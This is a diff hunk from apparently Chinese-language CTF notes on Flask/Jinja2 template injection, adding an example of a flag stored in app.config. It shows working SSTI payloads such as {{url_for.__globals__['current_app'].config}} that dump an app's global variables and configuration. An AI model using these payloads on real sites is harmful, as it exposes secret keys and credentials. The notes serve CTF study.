@@ -60,7 +60,7 @@ your input 77777777
 
 使用内置函数查看全局变量字典
 {{url_for.__globals__}}
-若里面有current_app，查看当前APP配置，里面可能有flag变量值。
+若里面有current_app，查看当前APP配置，里面可能有flag变量值。如：app.config['FLAG'] = os.environ.pop('FLAG')
 {{url_for.__globals__['current_app'].config}}
 也可
 {{get_flashed_messages.__globals__['current_app'].config}}
